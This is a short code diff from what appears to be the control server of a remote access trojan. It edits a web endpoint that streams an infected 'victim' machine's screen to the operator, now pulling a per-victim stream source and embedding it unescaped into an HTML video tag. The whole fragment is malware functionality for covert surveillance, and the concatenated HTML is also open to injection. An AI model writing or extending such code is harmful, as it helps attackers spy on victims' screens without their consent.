@@ -77,5 +77,12 @@ async def start_screenshare(id: str):
             victimIndex = RAT_SERVER.instance.victims.index(victim)
             print("Starting screenshare")
 
-            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='http://localhost:8000/clients/{id}/video' type='video/mp4'></video>", status_code=200)
+            print(victim)
+
+            if (victim["SCREENSHARE_SOURCE"] == ""):
+                return {"output": "Error: Screenshare not started"}
+
+            source = victim["SCREENSHARE_SOURCE"]
+
+            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='" + source + "' type='video/mp4'></video>", status_code=200)
     return {"output": "Error: Client not found"}
